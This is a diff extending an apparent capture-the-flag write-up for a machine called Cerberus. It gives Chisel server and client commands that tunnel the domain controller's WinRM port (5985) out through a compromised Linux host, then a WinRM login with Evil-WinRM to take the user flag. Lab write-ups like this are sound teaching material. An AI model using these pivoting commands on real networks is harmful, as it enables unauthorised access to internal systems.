@@ -249,3 +249,27 @@ Now, I have the password for Matthew as well. At this point I uploaded a nmap bi
 After the completing of port scan I got port 5985 open, which is used for powershell remote logon.
 
 ![image](https://user-images.githubusercontent.com/87700008/227236303-e33da113-486b-40f4-afd9-b83b085f79b1.png)
+
+Since the port 5985 is open & can only be accessed from the Linux device, at this point I have to perform the remort port forwarding to get all the traffic of Linux machine on my machine.
+
+For this purpose I will use "Chisel" binary & will run these commands on both devices :
+
+```
+#on my machine :
+
+./chisel_kill3r server -p 8000 --reverse [to receive the conenction on my port 8000]
+
+#on cerberus machine:
+
+./chisel_kill3r client 10.10.16.18:8000 R:5985:172.16.22.1:5985 [to forward all the traffic of DC from port 5985 to my host on port 8000]
+```
+
+![image](https://user-images.githubusercontent.com/87700008/227539739-2995ebb0-f003-4196-93b2-19053a653cb3.png)
+
+### User flag:
+
+After the successfull connection I can connect to the WinRm from my machine using Evil-WinRm:
+
+![image](https://user-images.githubusercontent.com/87700008/227540221-9aa20183-fbf1-4fd5-9482-334231282117.png)
+
+
